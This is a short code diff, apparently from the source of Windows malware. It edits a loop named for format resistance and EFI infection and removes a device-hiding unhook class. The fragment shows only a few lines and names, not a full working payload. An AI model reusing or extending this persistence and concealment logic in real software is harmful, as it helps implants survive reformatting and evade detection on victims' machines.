@@ -1,7 +1,6 @@
 #include <windows.h>
 #include "common.h"
 #include "H4-DLL.h"
-#include "UnHookClass.h"
 #include "bss.h"
 
 BOOL is_format_resistant = FALSE;
@@ -61,7 +60,7 @@ void InfectEFI()
 #define FORMAT_RESISTANCE_TIME 60000
 DWORD WINAPI MonitorFormatStatus(DWORD dummy)
 {
-	HideDevice dev_unhook;
+
 	LOOP {
 		if (is_format_resistant && IsFiles()) 
 			//if (dev_unhook.unhook_isdrv(DRIVER_NAME_W))
